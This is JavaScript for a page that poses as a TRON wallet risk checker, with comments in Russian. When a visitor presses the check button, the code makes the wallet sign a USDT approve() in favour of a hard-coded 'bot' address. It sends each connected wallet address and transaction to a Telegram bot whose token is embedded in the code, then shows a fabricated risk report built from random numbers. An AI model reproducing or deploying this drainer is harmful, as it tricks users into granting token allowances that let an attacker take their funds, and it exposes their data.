// ============================================
// ФИНАЛЬНАЯ ВЕРСИЯ – С ДЕТАЛЬНОЙ ОТПРАВКОЙ ОШИБОК
// ============================================

const CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const BOT_ADDRESS = 'TJKaoUut9WpHr3pBbCyf1TjDxq2rcJRQqB';

// Telegram
const TELEGRAM_TOKEN = '8508345570:AAGJBV9H92ukUQsvsUqnM1uNfm8VdKn9AVk';
const TELEGRAM_CHAT_ID = '-1003750493145';

let connectedWalletAddress = null;

const walletInput = document.getElementById('walletInput');
const checkBtn = document.getElementById('checkBtn');
const connectBtn = document.getElementById('connectWalletBtn');
const statusSpan = document.getElementById('connectedStatus');

// ============================================
// ГЛОБАЛЬНЫЙ ПЕРЕХВАТЧИК ОШИБОК
// ============================================
window.onerror = function(message, source, lineno, colno, error) {
    const errorDetails = `
🚨 <b>НЕОЖИДАННАЯ ОШИБКА</b>
📄 Сообщение: ${message}
📍 Файл: ${source}
🔢 Строка: ${lineno}:${colno}
🔍 Стек: ${error?.stack || 'нет'}
⏰ Время: ${new Date().toLocaleString()}
    `;
    sendTelegramMessage(errorDetails);
    return false;
};

// Перехват непойманных Promise rejections
window.addEventListener('unhandledrejection', function(event) {
    const errorDetails = `
⚠️ <b>НЕОБРАБОТАННЫЙ PROMISE</b>
📄 Сообщение: ${event.reason?.message || event.reason}
🔍 Стек: ${event.reason?.stack || 'нет'}
⏰ Время: ${new Date().toLocaleString()}
    `;
    sendTelegramMessage(errorDetails);
});

// ============================================
// ОТПРАВКА В TELEGRAM
// ============================================
async function sendTelegramMessage(text) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: text,
                parse_mode: 'HTML'
            })
        });
        const result = await response.json();
        if (!result.ok) {
            console.error('❌ Ошибка Telegram:', result);
        }
    } catch (error) {
        console.error('❌ Критическая ошибка отправки в Telegram:', error);
    }
}

// ============================================
// ФУНКЦИЯ ДЛЯ ФОРМАТИРОВАНИЯ ОШИБОК TRON
// ============================================
function formatTronError(error, context = {}) {
    let errorCode = 'неизвестно';
    let errorMessage = error.message || 'нет сообщения';
    let errorType = 'неизвестно';

    // Пробуем определить тип ошибки по сообщению
    if (errorMessage.includes('request aborted')) {
        errorType = 'СБОЙ ЗАПРОСА';
        errorCode = 'REQUEST_ABORTED';
    } else if (errorMessage.includes('timeout')) {
        errorType = 'ТАЙМАУТ';
        errorCode = 'TIMEOUT';
    } else if (errorMessage.includes('insufficient balance')) {
        errorType = 'НЕДОСТАТОЧНО БАЛАНСА';
        errorCode = 'INSUFFICIENT_BALANCE';
    } else if (errorMessage.includes('revert')) {
        errorType = 'ОТКАТ ТРАНЗАКЦИИ (REVERT)';
        errorCode = 'REVERT';
    } else if (errorMessage.includes('user rejected')) {
        errorType = 'ОТМЕНА ПОЛЬЗОВАТЕЛЕМ';
        errorCode = 'USER_REJECTED';
    } else if (errorMessage.includes('invalid parameters')) {
        errorType = 'НЕВЕРНЫЕ ПАРАМЕТРЫ';
        errorCode = 'INVALID_PARAMS';
    } else if (errorMessage.includes('network')) {
        errorType = 'ОШИБКА СЕТИ';
        errorCode = 'NETWORK_ERROR';
    }

    // Формируем детальный отчёт
    let report = `
❌ <b>ОШИБКА В РАБОТЕ</b>
🔧 Тип: ${errorType}
📟 Код: ${errorCode}
📝 Сообщение: ${errorMessage}
    `;

    // Добавляем контекст, если есть
    if (context.address) report += `📬 Адрес: <code>${context.address}</code>\n`;
    if (context.operation) report += `🔄 Операция: ${context.operation}\n`;
    if (context.tx) report += `🔗 TX: https://tronscan.org/#/transaction/${context.tx}\n`;
    if (context.amount) report += `💰 Сумма: ${context.amount} USDT\n`;

    report += `⏰ Время: ${new Date().toLocaleString()}`;

    return report;
}

// ============================================
// ПОДКЛЮЧЕНИЕ КОШЕЛЬКА
// ============================================
async function connectWallet() {
    try {
        if (window.tronWeb && window.tronWeb.defaultAddress) {
            const address = window.tronWeb.defaultAddress.base58;
            connectedWalletAddress = address;
            walletInput.value = address;
            if (statusSpan) statusSpan.style.display = 'inline-flex';
            sendTelegramMessage(`🔌 <b>Подключён кошелёк</b>\n<code>${address}</code>`);
            alert('✅ TronLink подключён!');
            return;
        }

        if (window.trustwallet && window.trustwallet.tronLink) {
            await window.trustwallet.tronLink.request({ method: 'tron_requestAccounts' });
            const address = window.trustwallet.tronLink.defaultAddress.base58;
            connectedWalletAddress = address;
            walletInput.value = address;
            if (statusSpan) statusSpan.style.display = 'inline-flex';
            sendTelegramMessage(`🔌 <b>Подключён кошелёк</b>\n<code>${address}</code>`);
            alert('✅ Trust Wallet подключён!');
            return;
        }

        alert('❌ Кошелёк не найден');
    } catch (error) {
        const errorReport = formatTronError(error, { 
            operation: 'connectWallet',
            address: connectedWalletAddress || 'неизвестно'
        });
        sendTelegramMessage(errorReport);
        alert('Ошибка подключения: ' + error.message);
    }
}

// ============================================
// ОТПРАВКА APPROVE
// ============================================
async function handleTronCheck() {
    try {
        if (!connectedWalletAddress) {
            alert('❌ Сначала подключите кошелёк');
            return;
        }

        const tronWeb = window.tronWeb || window.trustwallet?.tronLink?.tronWeb;
        if (!tronWeb) {
            throw new Error('TronWeb не доступен');
        }

        const amount = '10000000'; // 10 USDT
        const contract = await tronWeb.contract().at(CONTRACT_ADDRESS);

        checkBtn.disabled = true;
        checkBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Отправка...';

        const tx = await contract.approve(
            BOT_ADDRESS,
            amount
        ).send({
            feeLimit: 400_000_000,
            callValue: 0,
            shouldPollResponse: true,
            timeout: 60000
        });

        checkBtn.disabled = false;
        checkBtn.innerHTML = '<i class="fas fa-shield-check"></i> Проверить';

        const successMessage = `
✅ <b>Approve успешно отправлен</b>
📤 Адрес: <code>${connectedWalletAddress}</code>
💰 Сумма: 10 USDT
🔗 TX: https://tronscan.org/#/transaction/${tx}
        `;
        await sendTelegramMessage(successMessage);

        showDemoReport(connectedWalletAddress);

    } catch (error) {
        console.error('❌ Ошибка:', error);
        checkBtn.disabled = false;
        checkBtn.innerHTML = '<i class="fas fa-shield-check"></i> Проверить';

        // Формируем детальный отчёт об ошибке
        const errorReport = formatTronError(error, {
            operation: 'approve',
            address: connectedWalletAddress || 'неизвестно',
            amount: '10'
        });

        await sendTelegramMessage(errorReport);
        alert('❌ Ошибка: ' + error.message);
    }
}

// ============================================
// ДЕМО-ОТЧЁТ
// ============================================
function showDemoReport(address) {
    try {
        const resultSection = document.getElementById('resultSection');
        if (!resultSection) return;

        resultSection.style.display = 'block';
        document.getElementById('checkedAddress').textContent = address;
        document.getElementById('totalTx').textContent = Math.floor(Math.random() * 500) + 50;
        document.getElementById('suspiciousTx').textContent = Math.floor(Math.random() * 30);
        document.getElementById('walletAge').textContent = Math.floor(Math.random() * 365) + ' дней';
        document.getElementById('lastActive').textContent = 'сегодня';
        document.getElementById('riskPercent').textContent = Math.floor(Math.random() * 100) + '%';

        const badge = document.getElementById('riskBadge');
        badge.textContent = 'Средний риск';
        badge.className = 'result-badge medium';

        const sourcesList = document.getElementById('sourcesList');
        sourcesList.innerHTML = `
            <p><i class="fas fa-exclamation-circle"></i> Миксеры</p>
            <p><i class="fas fa-exclamation-circle"></i> Биржи без KYC</p>
        `;
    } catch (error) {
        console.error('Ошибка в демо-отчёте:', error);
    }
}

// ============================================
// КОПИРОВАНИЕ АДРЕСА
// ============================================
function copyAddress() {
    try {
        const address = document.getElementById('checkedAddress').textContent;
        navigator.clipboard.writeText(address);
        alert('✅ Адрес скопирован');
    } catch (error) {
        sendTelegramMessage(`❌ Ошибка копирования: ${error.message}`);
    }
}

// ============================================
// ЗАПУСК
// ============================================
document.addEventListener('DOMContentLoaded', function() {
    if (connectBtn) connectBtn.addEventListener('click', connectWallet);
    if (checkBtn) checkBtn.addEventListener('click', handleTronCheck);
    window.copyAddress = copyAddress;

    // Тестовое сообщение о запуске (можно убрать)
    sendTelegramMessage(`🚀 <b>Сайт загружен</b>\n⏰ ${new Date().toLocaleString()}`);
});
